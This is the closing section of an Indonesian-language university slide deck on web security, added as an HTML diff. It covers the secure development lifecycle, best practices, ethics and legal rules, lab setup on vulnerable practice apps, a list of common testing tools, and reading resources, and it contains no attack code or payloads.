+            <!-- Slide 22: Secure Development Lifecycle -->
+            <section>
+                <h2>🔄 Secure Development Lifecycle</h2>
+                <div style="font-size: 0.8em;">
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #3498db;"></div>
+                        <div><strong>1. Requirements:</strong> Tentukan security requirements & threat model</div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #9b59b6;"></div>
+                        <div><strong>2. Design:</strong> Security architecture, principle of least privilege</div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #e67e22;"></div>
+                        <div><strong>3. Implementation:</strong> Secure coding, code review, SAST tools</div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #27ae60;"></div>
+                        <div><strong>4. Testing:</strong> Pentest, vulnerability scan, DAST tools</div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #e74c3c;"></div>
+                        <div><strong>5. Deployment:</strong> Secure configuration, hardening</div>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot" style="background: #1abc9c;"></div>
+                        <div><strong>6. Maintenance:</strong> Patch management, monitoring, incident response</div>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 30px;">
+                    <p style="margin: 0;"><strong>Ingat:</strong> Security bukan one-time activity, tapi <strong>continuous process</strong>!</p>
+                </div>
+            </section>
+
+            <!-- Slide 23: Best Practices Summary -->
+            <section>
+                <h2>✨ Best Practices Summary</h2>
+                <div class="grid-2" style="font-size: 0.8em;">
+                    <div>
+                        <h3 style="color: var(--success-color);">✓ DO (Lakukan)</h3>
+                        <ul class="custom-list" style="text-align: left;">
+                            <li>Validate ALL user input</li>
+                            <li>Encode ALL output</li>
+                            <li>Update software regularly</li>
+                            <li>Implement CSRF tokens</li>
+                            <li>Use HTTPS everywhere</li>
+                            <li>Enable security headers</li>
+                            <li>Log security events</li>
+                            <li>Use strong passwords</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 style="color: var(--accent-color);">✗ DON'T (Jangan)</h3>
+                        <ul class="danger-list" style="text-align: left;">
+                            <li>Trust user input</li>
+                            <li>Use default configurations</li>
+                            <li>Store passwords in plaintext</li>
+                            <li>Ignore security updates</li>
+                            <li>Display detailed errors</li>
+                            <li>Use eval() atau innerHTML</li>
+                            <li>Disable security features</li>
+                            <li>Forget about logging</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 24: Ethical Hacking Reminder -->
+            <section>
+                <h2>⚖️ Aspek Etika & Legal</h2>
+                <div class="danger-box" style="font-size: 1.1em; padding: 30px;">
+                    <h3 style="margin-top: 0;">🚨 PERINGATAN KERAS! 🚨</h3>
+                    <p><strong>Semua teknik yang diajarkan HANYA untuk tujuan PENDIDIKAN!</strong></p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="warning-box">
+                        <h3 style="color: white; margin-top: 0;">❌ DILARANG</h3>
+                        <ul style="text-align: left;">
+                            <li>Testing tanpa izin</li>
+                            <li>Mengakses sistem orang lain</li>
+                            <li>Menyebarkan exploit</li>
+                            <li>Menjual kerentanan</li>
+                        </ul>
+                    </div>
+                    <div class="success-box">
+                        <h3 style="margin-top: 0;">✓ BOLEH</h3>
+                        <ul style="text-align: left;">
+                            <li>Testing sistem sendiri</li>
+                            <li>Lab environment</li>
+                            <li>Dengan izin tertulis</li>
+                            <li>Responsible disclosure</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top: 20px;">
+                    <p style="margin: 0;"><strong>Konsekuensi pelanggaran:</strong> Sanksi akademik, pidana penjara, denda, kehilangan reputasi profesional</p>
+                </div>
+            </section>
+
+            <!-- Slide 25: Praktikum Info -->
+            <section>
+                <h2>🧪 Info Praktikum</h2>
+                <div class="info-box">
+                    <h3 style="color: white; margin-top: 0;">Yang Akan Dipraktikkan</h3>
+                    <div class="grid-2" style="margin-top: 20px;">
+                        <ul style="text-align: left;">
+                            <li>Scanning web server dengan Nikto</li>
+                            <li>Directory brute forcing</li>
+                        </ul>
+                        <ul style="text-align: left;">
+                            <li>Testing XSS vulnerabilities</li>
+                            <li>Demonstrasi CSRF attack</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top: 20px;">
+                    <h3 style="color: white; margin-top: 0;">⚠️ Aturan Praktikum</h3>
+                    <ul style="text-align: left;">
+                        <li>✓ Gunakan <strong>virtual machine</strong> (Kali Linux)</li>
+                        <li>✓ Testing HANYA pada <strong>target vulnerable apps</strong> (DVWA, bWAPP)</li>
+                        <li>✓ Jaringan <strong>terisolasi</strong> dari internet</li>
+                        <li>✓ Dokumentasikan semua aktivitas</li>
+                        <li>✗ JANGAN test sistem real/production</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 26: Tools Overview -->
+            <section>
+                <h2>🛠️ Tools untuk Web Security Testing</h2>
+                <div class="grid-3" style="font-size: 0.75em;">
+                    <div class="card">
+                        <div class="card-header">🔍 Scanning</div>
+                        <ul style="text-align: left;">
+                            <li><strong>Nikto</strong> - Web server scanner</li>
+                            <li><strong>OWASP ZAP</strong> - Proxy & scanner</li>
+                            <li><strong>Burp Suite</strong> - Testing platform</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">🎯 Exploitation</div>
+                        <ul style="text-align: left;">
+                            <li><strong>SQLmap</strong> - SQL injection</li>
+                            <li><strong>XSSer</strong> - XSS testing</li>
+                            <li><strong>Metasploit</strong> - Exploitation framework</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">📁 Discovery</div>
+                        <ul style="text-align: left;">
+                            <li><strong>dirb/dirbuster</strong> - Directory brute force</li>
+                            <li><strong>gobuster</strong> - Fast scanner</li>
+                            <li><strong>ffuf</strong> - Fuzzing tool</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 30px;">
+                    <p style="margin: 0;">💡 Semua tools ini sudah terinstall di <strong>Kali Linux</strong></p>
+                </div>
+            </section>
+
+            <!-- Slide 27: Resources -->
+            <section>
+                <h2>📚 Sumber Belajar Tambahan</h2>
+                <div class="grid-2" style="font-size: 0.8em;">
+                    <div class="card">
+                        <div class="card-header">🌐 Online Resources</div>
+                        <ul style="text-align: left;">
+                            <li><strong>OWASP.org</strong> - Dokumentasi keamanan</li>
+                            <li><strong>PortSwigger Academy</strong> - Web security training</li>
+                            <li><strong>HackerOne</strong> - Bug bounty reports</li>
+                            <li><strong>PentesterLab</strong> - Hands-on exercises</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">🎮 Practice Platforms</div>
+                        <ul style="text-align: left;">
+                            <li><strong>DVWA</strong> - Damn Vulnerable Web App</li>
+                            <li><strong>bWAPP</strong> - Buggy Web Application</li>
+                            <li><strong>WebGoat</strong> - OWASP teaching app</li>
+                            <li><strong>HackTheBox</strong> - CTF platform</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top: 20px;">
+                    <h3 style="color: white; margin-top: 0;">📖 Referensi Buku</h3>
+                    <ul style="text-align: left;">
+                        <li>The Web Application Hacker's Handbook (Stuttard & Pinto)</li>
+                        <li>CEH v13 Modules 13 & 14</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 28: Key Takeaways -->
+            <section>
+                <h2>🎯 Key Takeaways</h2>
+                <div style="font-size: 0.85em;">
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">1️⃣ Web server adalah target utama karena harus <strong>terbuka ke internet</strong></p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">2️⃣ <strong>OWASP Top 10</strong> adalah panduan risiko keamanan web paling kritis</p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">3️⃣ <strong>XSS</strong> menyuntikkan script berbahaya → curi cookie, phishing</p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">4️⃣ <strong>CSRF</strong> memaksa user melakukan aksi → transfer dana tanpa sadar</p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">5️⃣ <strong>Defense in Depth</strong> → gunakan multiple layers of protection</p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">6️⃣ <strong>Security headers</strong> (CSP, HSTS) sangat penting untuk proteksi</p>
+                    </div>
+                    <div class="info-box">
+                        <p style="margin: 5px 0;">7️⃣ Security bukan one-time → <strong>continuous process</strong></p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 29: Q&A -->
+            <section>
+                <h2>❓ Pertanyaan & Diskusi</h2>
+                <div class="big-icon">💬</div>
+                <div class="info-box">
+                    <h3 style="color: white; margin-top: 0;">Silakan bertanya!</h3>
+                    <p>Jangan ragu untuk bertanya tentang:</p>
+                    <ul>
+                        <li>Konsep yang belum jelas</li>
+                        <li>Contoh real-world</li>
+                        <li>Cara mencegah serangan</li>
+                        <li>Setup praktikum</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 30: Thank You -->
+            <section class="title-slide">
+                <h1>Terima Kasih! 🙏</h1>
+                <div class="big-icon">🎓</div>
+                <div style="margin-top: 40px;">
+                    <p style="font-size: 1.2em;"><strong>Selamat belajar dan jadilah ethical hacker yang bertanggung jawab!</strong></p>
+                </div>
+                <div style="margin-top: 60px; font-size: 0.9em;">
+                    <p>Program Studi Teknik Informatika</p>
+                    <p>Universitas Pertahanan RI</p>
+                </div>
+                <div style="margin-top: 40px; font-size: 0.8em; opacity: 0.8;">
+                    <p>🔐 Stay Safe, Stay Ethical 🔐</p>
+                </div>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'slide',
+            backgroundTransition: 'fade',
+            center: true,
+            width: 1280,
+            height: 720,
+            margin: 0.04,
+            controls: true,
+            progress: true,
+            history: true,
+            keyboard: true,
+            overview: true,
+            touch: true,
+            loop: false,
+            rtl: false,
+            fragments: true,
+            embedded: false,
+            help: true,
+            showNotes: false,
+            autoPlayMedia: null,
+            preloadIframes: null,
+            mouseWheel: false,
+            hideInactiveCursor: true,
+            hideCursorTime: 5000,
+            navigationMode: 'default',
+            pdfMaxPagesPerSlide: 1,
+            pdfSeparateFragments: true,
+        });
+    </script>
+</body>
+</html>
